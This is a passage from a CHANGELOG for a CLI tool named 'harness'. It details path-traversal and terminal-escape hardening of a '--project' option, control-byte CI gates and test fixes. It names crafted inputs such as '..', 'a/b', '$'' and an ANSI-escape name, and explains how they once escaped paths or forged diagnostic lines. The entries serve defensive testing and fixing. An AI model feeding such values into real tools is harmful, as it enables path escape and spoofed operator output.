  - **Review-round fixes: the deny note now states only what the hook established** (task `799de976`, commit `3d3bddf`; the same defect class recurred in four consecutive rounds, so this round closes the CLASS). Each round's note asserted something the hook had not established, and each fix replaced one guessed cause with a narrower guess that the next reachable state falsified: first "no attempt reads as currently live" where the liveness check had thrown, then "the verdict directory could not be read" where only the lock path was unreadable, then "the verdict directory or the attempt-lock path could not be read" for an id from which NEITHER path can be derived. An id `sanitizeVerdictId` rejects (`.`, `..`, anything sanitizing to an empty basename, reachable from an active claim; the `SOLUTION_VERDICT_ID` path validates through the same function and answers null instead) is now its own `NullVerdictInfo` union member, settled before anything is read and carrying no `liveness` field, so "the id was unusable" has no field left to render as "a path could not be read"; its note names that one fact, points at the active claim, and asks for a usable id instead of repeating `solution_evaluate` for an id that can never be accepted. The remaining unknown-liveness line names no cause at all. Reading (3) no longer says "could not be read or parsed" for a marker `readVerdict` refuses by policy (a symlink, a non-regular file); it names the complete set of ways that read answers null for a present path, at the hook and at the shared reading-label site (`RECONNECT_THREE_READINGS_LABELS`). A state table in `tests/cli/pack-hook-solution-acceptance.test.ts` ("null-verdict deny note: one exact line per reachable state") pins one exact expected line per reachable (id-usability, reading, liveness) combination, nine rows, and asserts no other state's line appears, so this class fails there rather than reaching an agent; it doubles as the checklist for extending the classifier. The stale-lock fixture's back-date is a literal (90 s) rather than derived from `ATTEMPT_LOCK_STALE_MS`, so it discriminates a widened window instead of staying stale under every mutation of the constant it was meant to pin. Mutation probes restoring the guessed cause, narrowing reading (3)'s wording back, and widening the stale window to 300 s (`agent-primitives probe`, the last one scoped to the stale test alone) all killed.

  - **Round-6 review fix: the deny text is classified from ONE read of the marker** (task `799de976`, commit `244f9c3`). The gate read the marker at the decision site and the deny text classified it again a few statements later, so the two could disagree: a background attempt finishing in that window, the case this pack exists for, made the note tell the agent its fresh marker had been rejected when the gate had simply not seen it yet, and the reasons the note enumerated did not include the one that actually applied. A new `readVerdictDetailed` reports WHY a read yielded no verdict (`invalid-id`, `missing`, the shared reader's `symlink` / `not-regular` / `unreadable`, plus `invalid-record`) in one observation; `readVerdict` is the same function with the reason dropped, so every caller that needs only the gate decision is unchanged. Reading (3) no longer restates a disjunction over the rejection kinds: each kind renders its own line naming what that read established. The lines are a `Record` keyed by the exported `NULL_VERDICT_NOTE_STATES`, so a state with no line fails the build, and the state table's new coverage test fails when a listed state has no fixture, which makes the table a checklist rather than a convention. Two fixtures are added (a schema-invalid record, and a regular file the process may not read), the symlink and directory fixtures now pin their own distinct lines, and the unusable-id remedy names the verb that clears the claim instead of asking for an impossible re-run. The liveness helper loses a `catch` that became unreachable once id usability was settled first: an arm no mutant can kill is worse than no arm. Mutation probes collapsing one rejection line into another, and adding a note state with no fixture, both killed; the removed race itself is not fixture-testable, which is why the fix removes the second observation rather than adding a test for it.

### Added

- **Two release-hygiene CI gates: README's release sentence must match `package.json`, and the tagged CHANGELOG section must stay under a size ceiling** (task `3a910716`). `npm run check:readme-release-version` (`scripts/check-readme-release-version.mjs`) fails when README.md's "The current release is `` `vX.Y.Z` ``." sentence names a different version than `package.json`, wired into `ci.yml` next to `check:changelog-coverage`. `npm run check:release-notes-size` (`scripts/check-release-notes-size.mjs`) measures the CHANGELOG.md section for `package.json`'s version the same way `release.yml`'s awk extraction does and fails above a 115,000-character ceiling (the `0.57.0` section measured 110,880 characters when this gate was written; GitHub's release/tag body limit is roughly 125,000); `release.yml` runs the same measurement again at tag time, next to its existing empty-notes guard, so an oversized section is caught both before the tag and at release time. CONTRIBUTING.md's Releasing section now lists the release-prep steps in order (`npm version --no-git-tag-version`, CHANGELOG heading insertion, README sentence, bundle re-verification, the checks above, PR, merge, read the merge commit's CI, annotated tag). Also fixed two stale line-number citations of `CHANGELOG.md` (a `:141` in `docs/okf/log.md`, an `:18` in `src/cli/approve/understanding.ts`) into the repo's shift-proof `` `CHANGELOG.md:#x.y.z` `` heading-anchor form.

## [0.57.0] - 2026-09-21

### Fixed

- **`buildLockEntries` (`src/io/harness-lock.ts`) now applies the exported `isValidProjectName` guard at its own `{project}` sink (task `b5e6ccb0`), the follow-up task `e904f25a`'s CHANGELOG entry above filed.** An `opts.projectName` failing `isValidProjectName` (`".."`, a name containing a path separator, or a control character) now skips the templated memory directory's lock entry, exactly the way an absent `opts.projectName` already did, instead of the raw value being interpolated into the path this function stats, hashes and writes. Closes the gap the round-2 review of task `e904f25a` reproduced: a crafted `--project` through `harness apply` used to land its raw value in `harness.lock`, so a LATER `harness diff --since-apply` invocation that passed no `--project` at all would render it in the drift list. Of the four `{project}` interpolation sinks (`resolvePaths`, `substituteProject`, `buildLockEntries`, `generate-memory-index.ts`'s own substitution), three are now guarded; only `generate-memory-index.ts` remains open, still reserved for a separate Codex slice; until that slice lands, `--project ..` now writes no `harness.lock` entry while `generate-memory-index.ts` still indexes the raw, unvalidated `<home>/projects/../memory` path with no operator signal, a recorded interim divergence between the two sinks rather than a regression. `docs/CLI.md`'s SINK GUARD sentence and inventory and the `isValidProjectName` doc comment (now `src/io/project-name.ts`) are updated to name the new state. `isValidProjectName` and `sanitizeProjectForDisplay` moved from `src/runtime/git-context.ts` to the new `src/io/project-name.ts`, since `buildLockEntries` (`src/io/harness-lock.ts`) is itself one of the guarded sinks and `io/` may not import from `runtime/` (`io-no-upward-imports`, `.dependency-cruiser.cjs`); `src/runtime/git-context.ts` re-exports both names so existing consumers keep working unchanged. Pinned by three new `tests/io/harness-lock.test.ts` cases (`".."`, `"a/b"` and a control-bearing name, each also asserting the raw rejected value never appears in any returned entry), a new apply-level test in `tests/cli/apply/apply.test.ts` pinning the `apply.ts` wiring end to end, and an import assertion pinning the `git-context.ts` re-export; a mutation probe removing the new guard (`agent-primitives probe --pre 'npm run build'`) killed.

  - **Round-2 review fixes** (task `b5e6ccb0`; one HIGH maintainability, three MEDIUM docs/correctness, one LOW tests). The round-1 `src/io/project-name.ts` regex literal (`PROJECT_NAME_CONTROL_CHARS`) was typed with RAW control bytes (a NUL among them) instead of the escaped backslash-u-0000 to backslash-u-001f / backslash-u-007f to backslash-u-009f form the base had, which made git treat the file as binary and every plain-text search for `isValidProjectName` in it come up empty; it is now escaped exactly as the base was. A new `scripts/check-no-nul-bytes.mjs` (`npm run check:no-nul-bytes`, wired into `.github/workflows/ci.yml`) scans every file under `src/` and `tests/` for a raw NUL byte and fails the build on one, with a narrow, documented allowlist for the one pre-existing, intentional NUL delimiter in `src/cli/apply/generate-settings.ts`'s command fingerprint (PR #438; out of this task's scope to change). `CHANGELOG.md`, `docs/CLI.md` (two sites) and `docs/okf/log.md` now name `src/io/project-name.ts`, not `src/runtime/git-context.ts`, as the definition site for `isValidProjectName`/`sanitizeProjectForDisplay`. `substituteProject`'s doc comment (`src/probes/memory.ts`) now names only `generate-memory-index.ts` as unguarded, not `buildLockEntries`. An unreachable per-entry loop after `expect(entries).toEqual([])` in `tests/io/harness-lock.test.ts` is now a single `not.toContain` assertion.
  - **Round-3 review fixes** (task `b5e6ccb0`; the round-2 raw-control-byte class recurred, so this round fixes the CLASS, not the instance). `tests/io/harness-lock.test.ts`'s `"a control character"` case carried a literal BEL byte (the same defect class round 2's gate was built to catch, just outside that gate's NUL-only scope); it now reads the escaped `"a\u001b[31mb"`, matching the sibling `tests/runtime/git-context.test.ts` idiom. The gate itself is renamed `scripts/check-no-raw-control-bytes.mjs` (`npm run check:no-raw-control-bytes`) and widened from NUL-only to the full raw C0/C1/DEL control-byte class (0x00-0x08, 0x0B-0x0C, 0x0E-0x1F, 0x7F, and the C1 range U+0080-U+009F as its two-byte UTF-8 encoding; tab/LF/CR stay allowed) and from `src/`+`tests/` to also cover `scripts/`, `docs/`, `.github/` and the repo root's own `*.md`/`*.yml`/`*.yaml`/`*.json` files (a small binary-extension denylist skips any binary asset under a scanned directory), closing the gap that let the round-2 fix itself land a raw NUL in a `CHANGELOG.md`/`ci.yml` edit undetected. The allowlist now pins the exact occurrence COUNT expected per file (`{ path, count, reason }`), not only file membership: two extra NULs silently appended to the allowlisted `src/cli/apply/generate-settings.ts` used to pass unnoticed (the file was allowlisted at all, regardless of how many raw bytes it held); they now fail as a count mismatch, caught by a new `tests/scripts/check-no-raw-control-bytes.test.ts` (allowlisted file at its pinned count passes, one extra byte fails, a raw BEL in a scratch file fails, tab/LF/CR pass, a C1 byte fails). `docs/okf/log.md`'s newest entry no longer claims no citation moved; it now names the re-pointed citations, enumerated from the commit range instead of counted by hand (`git diff <base>..HEAD -U0 -- docs`, then a per-file multiset diff of every `path:N[-M]` token): `src/runtime/git-context.ts:392` to `:393` (`docs/okf/log.md`, both occurrences, for the new `io/project-name.ts` import); `src/probes/memory.ts:277` to `:276` (`docs/okf/log.md` and `docs/decisions/2026-09-08-preflight-floors.md`, for the narrowed `substituteProject` comment); and the `sha256: string;` range in `src/io/harness-lock.ts`, from lines 48-57 to `src/io/harness-lock.ts:49-58` (`docs/decisions/2026-08-27-ug-auto-mode-approval.md`, shifted by the `isValidProjectName` import added at `src/io/harness-lock.ts:34`), the one this sub-entry originally omitted while stating its list was complete. Follow-up filed as harness task `0b747433-c697-48bc-adc4-f3a24cc4fa37`, not yet done: replace `generate-settings.ts`'s NUL template-literal delimiter with an escape-safe form, which would drop the allowlist entry entirely; changing the delimiter is out of this task's scope.
  - **Round-4 review fixes** (task `b5e6ccb0`; two MEDIUM, three LOW, all in the round-3 gate and its surrounding docs, no `src/` change). The gate `scripts/check-no-raw-control-bytes.mjs` resolved its scan root from `process.cwd()` and wrapped `readdirSync` in a catch that returned an empty list, so a renamed or missing scan directory, or a run from any other directory, printed `OK, scanned 0 file(s)` and exited 0: a green gate that had checked nothing. It now resolves the repo root from its own module URL (`fileURLToPath(import.meta.url)`, one level up from `scripts/`), verifies every `SCAN_DIRS` entry exists and is a directory before scanning, and exits 2, a distinct IO/scope code kept separate from 1 for a real violation, naming the offending path for a missing or non-directory scan entry, an unreadable directory, or an unreadable file; nothing is caught silently. `collectScanFiles` now skips `node_modules`/`dist`/`coverage`/`.git` by directory NAME at any depth, which is what makes the header's "never descends into" sentence true: it held only for the non-recursive root sweep, while a nested `tests/<fixture>/node_modules/` inside a scanned tree was still walked and flagged. The root sweep now also covers `*.ts`/`*.cjs`/`*.mjs` (`vitest.config.ts` and `.dependency-cruiser.cjs` today), so a control byte appended to a root config file no longer passes. What sits deliberately outside the gate is documented in its header with the reason: `dogfood/` (captured terminal transcripts carry real control bytes as data, not as a defect), `.ai/` (orchestrator run state: `.ai/runs/` and the `.ai/run` pointer are gitignored, and what is tracked under `.ai/` is kit-installed workflow state rather than hand-edited source), the generated and vendored directories above, and symlinks, which are followed in neither direction because `Dirent.isFile()` is false for them. `evaluateFile`'s JSDoc no longer documents an "allowed" status the function cannot return. The allowlist comment and the round-3 sub-entry above now name the `generate-settings.ts` delimiter follow-up by its tracker id (harness task `0b747433-c697-48bc-adc4-f3a24cc4fa37`) instead of pointing at a clause that no longer existed anywhere. Pinned by new `tests/scripts/check-no-raw-control-bytes.test.ts` cases: a missing scan directory and a scan entry that is a FILE each exit 2 naming it; an unreadable directory inside a scanned tree exits 2 instead of scanning short; a nested `node_modules`/`dist`/`coverage` is skipped; a BEL in a root `.ts` fails; the allowlisted file with its pinned byte REMOVED fails as `expected 1 ... found 0`, the direction a `>` comparison would have passed; and two real runs of the script, one from the repo root and one from an unrelated cwd, agree on the scanned file count. Mutation probes for each of those three behaviours (the silent catch restored, `!==` weakened to `>`, root `*.ts` dropped from the sweep) killed.

- **`src/cli/apply/generate-settings.ts`'s hook-dedupe fingerprint delimiter is no longer a raw NUL byte** (task `0b747433`, the follow-up filed by task `b5e6ccb0`'s round 3). `buildGroups`'s `(command, timeout)` dedupe key now joins with the `\u0000` escape instead of a literal `0x00` byte, byte-identical at runtime (the same character, just written so git and `rg`/`grep` see the file as text instead of binary); the fingerprint construction is factored out into a new exported `computeHookFingerprint(command, timeout)`, same formula, now independently testable. The extraction moves `hookTimeoutSeconds` down the file, so `docs/okf/codex-adapter-parity-gaps.md`'s citation is re-pointed, now in the anchored form the citation guard checks, and the doc re-stamped. `src/cli/apply/generate-settings.ts`'s entry, the allowlist's only one, is removed from `ALLOWED_CONTROL_BYTE_FILES` in `scripts/check-no-raw-control-bytes.mjs` along with the comment naming this task as pending; the allowlist is now empty. `tests/scripts/check-no-raw-control-bytes.test.ts`'s count-mismatch and stale-entry coverage, previously leaning on that live entry, now injects and removes its own temporary allowlist entry per test instead. A new `tests/cli/apply/generate-settings.test.ts` case pins the delimiter's collision safety directly against `computeHookFingerprint`: a command containing a literal space plus an empty timeout does not collide with a command/timeout split at that space. That pair is reachable only with a timeout cast past its `number` type (a numeric timeout never renders a trailing space), so the test pins collision-proofness for arbitrary string inputs, not a defect that well-typed manifests could hit; a second case pins the NUL-joined wire format itself.
- **`substituteProject` (`src/probes/memory.ts`) now applies the exported `isValidProjectName` guard, one of the sinks task `1c4eb3ea` left unguarded (agent-tasks `e904f25a`).** An invalid `--project` value (`".."`, a name containing a path separator, etc.) degrades to the "no project supplied" branch instead of being interpolated into the `{project}` placeholder: the literal survives substitution and is reported as an `unresolved: true` pattern (informational, not "missing"), never a concrete path resolved outside the directory the placeholder is meant to occupy. Two of the four sinks remain unguarded after this change, `generate-memory-index.ts`'s own `{project}` substitution and `buildLockEntries` (`src/io/harness-lock.ts`): the former is reserved for a Codex slice per the pandora handoffs (so the split, this sink guarded now, that one left for Codex, is recorded rather than worked around), the latter is a follow-up to file. Both are reached only through an explicit `--project` flag, never through a cwd-derived name. `docs/CLI.md`'s SINK GUARD sentence and the `isValidProjectName` doc comment (`src/runtime/git-context.ts`) are updated to name the new state. Pinned by a new test in `tests/probes/memory.test.ts` ("rejects an invalid opts.project" with a `".."` value); a mutation probe removing the new guard (`agent-primitives probe --pre 'npm run build'`) killed.

  - **Review round 1 fixes** (task `e904f25a`, round 2; one MEDIUM correctness, two LOWs docs, two LOWs UX/placement). Round 1's own review found: `substituteProject` still used `String.prototype.replace` with a regex, so a project value like `$'` or `` $` `` is interpreted as a `replace`-special reference instead of literal text, and substitution ran BEFORE `expandHome`, so a project value of `~` could re-anchor a relative pattern to the home directory; the CHANGELOG's own round-1 entry above (and `docs/CLI.md`, and the `git-context.ts` doc comment) named only a two-sink split when a third `{project}` sink (`buildLockEntries`, `src/io/harness-lock.ts:289-291`, fed from `opts.project` in `src/cli/apply/apply.ts`) exists unguarded and un-reserved; `docs/okf/log.md` got no entry; a rejected `--project` value produced no diagnostic at all, `doctor` printed the same "resolved per-project at runtime" note an ordinary unresolved pattern gets; and the source comments in `memory.ts` and `git-context.ts` mixed the technical fact ("left unguarded") with the org-specific reservation rationale ("per the pandora handoffs"), which belongs only here. This entry closes all six.
  - **`substituteProject` now substitutes AFTER `expandHome`, and with `String.prototype.split`/`join` instead of `replace`+regex** (`src/probes/memory.ts`), matching the literal idiom `buildLockEntries` (`src/io/harness-lock.ts`) and `generate-memory-index.ts`'s `resolveDirPath` already use for the SAME placeholder. A project value of `$'` or `` $` `` is now inserted as literal text (previously interpreted by `replace`'s special replacement-pattern syntax, silently rewriting the path); a project value of `~` can no longer re-anchor a `{project}`-leading relative pattern to the home directory, since the manifest's own leading `~` is expanded before the placeholder is ever substituted. Pinned by three new `tests/probes/memory.test.ts` cases (`$'`/`` $` `` resolving literally, `~` not re-anchoring a relative pattern, and `a/b` rejected the same way `..` already was); two new mutation probes reverting each fix (`agent-primitives probe --pre 'npm run build'`) killed.
  - **The sink inventory corrected from two to three.** `buildLockEntries` (`src/io/harness-lock.ts:289-291`, fed from `opts.project` at `src/cli/apply/apply.ts:970,982,1035`) also interpolates `{project}` unguarded, and is NOT Codex-reserved the way `generate-memory-index.ts` is; guarding it is left as a follow-up for the orchestrator to file, out of this task's scope. `docs/CLI.md`'s SINK GUARD sentence, the `isValidProjectName` doc comment (`src/runtime/git-context.ts`), and this file's own round-1 entry above (marked superseded) now name all three.
  - **`docs/okf/log.md` gains a newest-first entry** recording `substituteProject` as guarded and `generate-memory-index.ts`/`buildLockEntries` as the two sinks still open.
  - **A rejected `--project` now produces its own diagnostic instead of the ordinary "unresolved pattern" note.** `MemoryReport` gains `projectRejected: string | null` (`src/probes/memory.ts`), set when `opts.project` was supplied but failed `isValidProjectName`; `harness doctor` (`src/cli/doctor/format.ts`) renders a warn line (`--project <name> rejected as an unsafe path segment; treating the directory as an unresolved pattern`) instead of the informational note, counted in `warningCount`; `harness list memories` (`src/cli/list.ts`) carries the same value as a `project_rejected` row field. No new exit code. Pinned by new `format()`/`list()` tests.
  - **The `memory.ts`/`git-context.ts` source comments now state the technical fact only** ("left unguarded ...; see CHANGELOG.md for the reservation/follow-up on each"); the Codex-reservation rationale for `generate-memory-index.ts` and the harness-lock.ts follow-up both stay recorded here, not duplicated into source.
  - **Round-2 review fixes** (task `e904f25a`; one MEDIUM correctness, three LOWs correctness/tests, one LOW maintainability, one LOW architecture/docs). `docs/CLI.md`'s SINK GUARD passage, previously one accreting ~9000-character paragraph, is now a short inventory (one lead sentence, a four-item sink list, one sentence on the rejected-case behaviour); this CHANGELOG's own superseded clause above now states plainly that three `{project}` sinks were unguarded as of task `1c4eb3ea` and two remain after this task. `harness doctor`'s rejection warn line (and its `warningCount` increment) is now gated on at least one memory directory actually carrying the `{project}` placeholder (`projectRejectionWarns`, exported from `src/probes/memory.ts`, shared by `format.ts` and `doctor/index.ts` instead of two hand-written copies); a rejected `--project` on a manifest with no `{project}`-templated directory now stays silent, and several such directories each keep their own per-directory note rather than being collapsed into the single warn line. `MemoryReport.projectRejected` now agrees with `substituteProject`'s own falsy check: an empty-string `--project` is "not supplied" in both places, not "supplied and rejected" in one and "not supplied" in the other. The `warningCount` increment for a rejected `--project` is now pinned by an exact-delta test in `tests/cli/doctor.test.ts` (a mutant deleting the increment previously survived). The `memory.ts`/`list.ts` source comments no longer name this review's own internal finding label, only the task id. `harness list <category>`'s conditionally-present `project_rejected` row field and the fact that only `doctor`, never `list`, ever warns are now both documented next to `docs/CLI.md`'s `harness list memories` notes and in `list.ts`'s own comment. Pinned by new `tests/probes/memory.test.ts` and `tests/cli/doctor.test.ts` cases; probes removing the placeholder gate and the empty-string agreement (`agent-primitives probe --pre 'npm run build'`) killed.
  - **A `--project` value can no longer carry a control character into `harness doctor` or `harness list memories` output, and the REJECTED value's echo is stripped.** `isValidProjectName` (`src/runtime/git-context.ts`) screened only for the shapes that escape a path segment (empty, `.`, `..`, `/`, `\`, NUL), so a name carrying a newline or an ANSI escape was ACCEPTED. `harness doctor` rendered it verbatim on its header line and `harness list memories` in its `project_rejected` row field; and because an accepted name is SUBSTITUTED into the memory directory path, doctor's own `memory directory missing` line and `list memories`' `path` row field rendered it verbatim too. A crafted value therefore forged an extra, diagnostic-looking line and wrote raw terminal escapes into the operator's terminal. Sanitizing at each rendering site did not close this: the substituted-path surfaces do not render the NAME, so enumerating rendering sites is open-ended by construction. The screen moved to the SOURCE instead. `isValidProjectName` now also rejects every C0 control character (`U+0000` to `U+001F`, NUL among them, which is why the separate NUL clause is gone), DEL (`U+007F`) and every C1 control character (`U+0080` to `U+009F`), so an accepted name, and any path it was substituted into, is a plain single-line string on every surface without that surface having to know. `sanitizeProjectForDisplay` (same module) stays for the one class the source screen cannot cover: a rejected value is by definition unvalidated and is still echoed back so the operator can see WHICH value was refused, on doctor's rejection warning, its per-directory note, its header `project:` clause and `list memories`' `project_rejected` field. The `session_start_preflight.setup` finding's `(project: X)` suffix keeps the same wrap as defense in depth rather than as a live echo, since `doctor()` sets that finding's `projectName` only when `resolvePaths` resolved a project layer FILE, which the validator already gates. Report DATA (`DoctorReport.project`, `MemoryReport.projectRejected`) keeps the raw value, carried over `--json` by JSON's own escaping rather than by a raw control byte. **Consequences.** `deriveProjectName` validates its own return value at every exit, so a checkout directory whose basename carries a control character now takes the same path a `..` basename already took: `null`, no project override layer resolves for that repository, the base/machine value applies, and the operator sees no error and no warning (pinned by a `deriveProjectName` case in `tests/runtime/git-context.test.ts`, beside the existing path-separator one: a real on-disk checkout directory whose basename carries a newline derives `null`) (doctor's setup-version finding then carries `projectName: null` and renders no `(project: X)` suffix). `resolvePaths` (`src/cli/loader.ts`) and `substituteProject` (`src/probes/memory.ts`) both refuse such a name at their own sinks. The two `{project}` sinks that remain unguarded, `generate-memory-index.ts`'s own substitution and `buildLockEntries` (`src/io/harness-lock.ts`), call the validator NOWHERE and therefore inherit nothing from this: both still interpolate an explicit `--project` value unvalidated, for path escapes and for control characters alike. Pinned by `tests/runtime/git-context.test.ts` (a newline-, ESC-, DEL- and NEL-bearing name rejected; `myproj`, `with space` and `ümläut` accepted; the path-escape shapes still rejected; plus a non-statefulness case, since the validator's `test` regex and the stripper's `g`-flagged one are deliberately two objects built from one source), `tests/cli/doctor.test.ts` and `tests/cli/list.test.ts` (a control-bearing name with NO path separator, end to end: rejected, echoed sanitized on exactly the lines that echo it, no forged line or row anywhere in the rendered report or the table, the substituted path still carrying the literal `{project}`, and `--json` parseable with no raw control byte on any line), and `tests/cli/doctor-session-start-preflight-setup-version.test.ts` (the `(project: X)` suffix rendered sanitized). A second `doctor` case pins a mixed manifest (one `{project}`-templated directory plus one concrete missing directory): both warnings appear and only the rejection is the extra one in `warningCount`. `format.ts`'s dead `projectRejected === null` re-test is a plain `else` carrying the reason. Two comments that referred to the display helper by a name it never shipped under now name `sanitizeProjectForDisplay` (`src/cli/list.ts`, `src/cli/doctor/format.ts`). `docs/CLI.md`'s SINK GUARD sentence and its rejected-`--project` paragraph state the two-rule invariant instead of a list of rendering sites.
  - **`docs/CLI.md`'s sink inventory says why the two open sinks are accepted, and renders as one list again.** The lead sentence now records the residual-acceptance reason (both open sinks are reached only through an explicit `--project` flag, never through a cwd-derived name, which `deriveProjectName` validates itself), the reservation rationale is a pointer to this file instead of an org-specific aside, and both continuation paragraphs under PER-REPO SCOPING are indented into that list item with the blank line before the next top-level bullet restored (checked by rendering the section with `markdown-it`: one list whose SECURITY bullet is a sibling item, instead of a list split in two by flush-left paragraphs).
...
- **`tests/scripts/memory-frontmatter-contract.test.ts`'s "uses the script location and keeps sync transactional through recovery faults" test now carries an explicit 20000ms per-test timeout** (task `1353a96e`). The test drives roughly 90+ synchronous `execFileSync("git", ...)`/`spawnSync(node, ...)` calls across its pinnedUpdatedFixture() passes, CLI invocations and fault-injection runs; under concurrent worker or machine load that exceeds vitest's default 5000ms `testTimeout`. First observed from a detached git worktree under `os.tmpdir()` (the environment `agent-primitives probe`'s default isolation copy uses; implementer: 2.8-4.1s in the checkout, up to ~6.2s there, 1/10 repeats timing out), but the review reproduced it from the ordinary checkout as well (2/13 full-suite runs at base timed out; head file from the checkout 5989ms and 5917ms in 10 runs under load; 25/25 green with the raised budget, worst 6372ms), so the variable is load, not the checkout location. This is the cold-subprocess-spawn-latency-vs-fixed-budget race already documented in `vitest.config.ts`, not the `os.tmpdir()`-exemption-swallow mechanism task `9a4a417b` (PR #527) fixed in `tests/runtime/hermetic-spawn-allowlist.test.ts`: this test derives no expected path from the script's own location or from `os.tmpdir()`, so there was no location assumption to correct. Fixed the same way `tests/cli/smoke/smoke.test.ts`'s "escalates to SIGKILL" test already is: a generous explicit timeout, no assertion weakened or removed. The body is synchronous, so the value is a reporting ceiling, not an abort guard.
...
- **The PR #522 migration note's SYMLINK and CASING rules for `session_start_preflight`'s per-repo project layer are now pinned by automated tests, not only by the hand-run CLI matrix behind that note's CHANGELOG entry and `docs/CLI.md`'s PER-REPO SCOPING notes** (task `6c8c1bae`). A loader-level fixture in `tests/cli/loader-project-layer.test.ts` drives `explainPolicy` (its own exported `session_start_preflight.source` field, the field the hand-run matrix read) with a scratch checkout shaped like a git work tree (a `.git` directory carrying only `HEAD`) reached through a symlink: a project layer directory keyed on the symlink's own name never resolves (`source: "base"`), the one keyed on the real directory's basename resolves (`source: "project"`), from the identical symlink cwd both times, matching the SYMLINK rule. A producer-level fixture at the end of `tests/cli/session-start/preflight.test.ts` drives `runSessionStartPreflight` itself with an `event.cwd` that is a symlink path, asserting the `setup` value the producer feeds to its `preflight` child comes from the project layer named after the real, on-disk basename.
  - **Round 2 (task `6c8c1bae`, review round 1 findings).** The CASING half was corrected and re-scoped after measurement on a real case-sensitive APFS volume (`hdiutil`, reviewer round 1): the producer's original single-layer CASING fixture ran unguarded, and on a case-sensitive filesystem it FAILED, not merely "stayed untested" as the round-1 entry claimed: `findGitEntry` (`src/runtime/git-context.ts`) never finds `.git` under a miscased access path there, so the producer short-circuits at its "cwd is not inside a git work tree" early return (`src/cli/session-start/index.ts`) with `result.wrote: false`, not the `setup: false` the round-1 comment predicted. Both the producer CASING test and a new loader-level CASING test now self-skip on a case-sensitive filesystem, mirroring `tests/runtime/git-context.test.ts`'s own case-differing test's `ctx.skip` guard. The round-1 producer CASING fixture also did not discriminate a producer that stops deriving a project name at all (`opts.project ?? repo`): in that single-repo shape `repo` and the correctly-derived name were the identical string, both folding onto the one on-disk layer on a case-insensitive `HARNESS_HOME`. The producer CASING test now reaches its differently-cased `event.cwd` through a LINKED WORKTREE of the main checkout, so `repo` (the worktree's own checkout basename) and the derived name (the main checkout's basename, reached via the worktree's `commondir` file) are genuinely different values; a decoy project layer keyed on `repo`'s value carries the opposite `setup`, so a producer that stopped deriving now fails the assertion instead of passing it by coincidence. A separate new loader-level fixture in `tests/cli/loader-project-layer.test.ts` pins the LAYER-DIRECTORY half of docs/CLI.md's PER-REPO SCOPING MIGRATION note's CASING rule directly (a project layer directory spelled in a different case than the derived project name still resolves on a case-insensitive `HARNESS_HOME`), which the producer fixture, once rewritten around the worktree shape, no longer exercises on its own. `deriveProjectName`'s `fs.realpathSync` step does NOT canonicalize a plain (non-symlink) differently-cased path segment (the same finding `tests/runtime/git-context.test.ts`'s own case-differing test already pins); what resolves the loader-level layer directory is a second, independent case-insensitivity in the layer FILE lookup itself (`fs.existsSync`/`fs.readFileSync`, `src/cli/loader.ts`).
  - **Round 3 (task `6c8c1bae`, review round 2 findings).** The producer CASING test's differently-cased `event.cwd` was decorative: with the linked-worktree fixture the derived name comes from the `commondir` file's own correctly-cased content, never from case-folding the access path, so the assertions held identically once the miscasing was replaced with the real, on-disk spelling. That test is renamed to what it pins (linked-worktree derivation plus raw-`event.cwd` passthrough, still using the decoy layer that discriminates the P2 mutant) and no longer varies casing or self-skips; the casing claim now lives in the loader-level CASING test alone. That loader-level CASING test no longer self-skips on a case-sensitive `HARNESS_HOME` either: it measures the fixture home's own case sensitivity with the shared probe and asserts both halves of the MIGRATION note's CASING sentence (`source: "project"` on a case-insensitive home, `source: "base"` on a case-sensitive one), so CI (ext4, case-sensitive) now runs and pins the case-sensitive half instead of skipping it. The inode-comparison probe, previously copied three times (`tests/runtime/git-context.test.ts` inline, the producer test, the loader test), is now exported once as `isCaseInsensitiveFilesystem` from `tests/_helpers/case-sensitivity.ts` and used by the loader test (`tests/runtime/git-context.test.ts` keeps its own inline copy). The SYMLINK and CASING describe blocks in `tests/cli/loader-project-layer.test.ts` also share their fixture builders (manifest, project layer, event, seams) now, parameterised by policy name/description and layer setup value, removing roughly 90 lines of duplication.

- **`tests/decisions-citations-resolve.test.ts` now blocks on a BARE `path:N[-M]` line citation into a source file in `docs/okf`, requiring an anchor** (task `898f9925`). Previously only ANCHORED docs/okf line citations were resolved against the current tree; a bare citation had no check at all, so a cited line could drift with nothing to catch it (batch-44: `quote-model-divergence.md` cited `src/cli/init/templates.ts:928` while the sentence had moved to line 940, caught only by a reviewer's manual sweep). The line-resolution checks used by the existing `docs/decisions citations resolve` describe block are now factored into a shared `checkLineCitation` helper (mirroring `checkHeadingCitation`'s existing pattern), reused by a new docs/okf-shaped fixture pair pinning that a shifted-line citation fails and the corrected form passes, and by a new ratchet asserting zero bare line citations into non-Markdown sources across `docs/okf` outside `log.md` (whose historical bare count is reported only in a computed test title, never asserted). All 48 live bare citations into non-Markdown sources outside `log.md` were converted to the anchored form in this same change (citation-only; one genuine drift re-pointed: `codex-adapter-parity-gaps.md`'s bare-basename `generate-codex-config.ts:151` corrected to `src/cli/apply/generate-codex-config.ts:151#"hookTimeoutSeconds"`), measured 2026-09-09 across 8 docs: `manifest-validation-scope.md` 13, `pause-vs-gate-kill-switch.md` 18, `policy-engine-producer-wiring.md` 5, `quote-model-divergence.md` 4, `understanding-gate-auto-mode-signals.md` 3, `understanding-gate-lockout-recovery.md` 3, `codex-adapter-parity-gaps.md` 1, `gate-fail-posture-matrix.md` 1; `docs/okf/index.md`'s Maintenance section names the rule, these counts are recorded here rather than there so the doc's own coverage paragraph does not go stale as citations shift. **Round 2 (reviewer re-derivation of all 48 conversions) found: eight of the anchors were punctuation-only** (a bare closing delimiter such as `#"}"`, `#");"`, `#"};"` on a bare-delimiter end line), passing checks (d)-(f) by accident while pinning nothing against a line shift; each re-anchored on a token its doc's own sentence names, narrowing the range end past the delimiter for six of them (`manifest-validation-scope.md:21`, `pause-vs-gate-kill-switch.md:50,87,92,95`, `policy-engine-producer-wiring.md:25`); two, `pause-vs-gate-kill-switch.md:48` (`src/cli/pause/index.ts:269-274#"is the friction"`) and `:53` (`226-232#"non-TTY stdin"`), narrowed past real message lines too, corrected in round 3 (task `898f9925` round 3, decision D-031) by widening both back to their last real content line before the closing `EX_USAGE` argument, each unique in its own range: `269-279#"EX_USAGE"` and `226-241#"EX_USAGE"`. A ninth range, `pause-vs-gate-kill-switch.md:46`'s `src/cli/index.ts:3330-3419`, had been narrowed from the original `3330-3429` by dropping the resume verb's ledger-audit branch (real code, not a trailing delimiter); its round-2 replacement, a single `3330-3421` anchor disambiguated only by ten leading spaces of indentation, is unique in the range through whitespace alone (the trimmed text occurs twice), so round 3 (task `898f9925` round 3, decision D-031) split it into two citations instead, one per verb, each ending on its 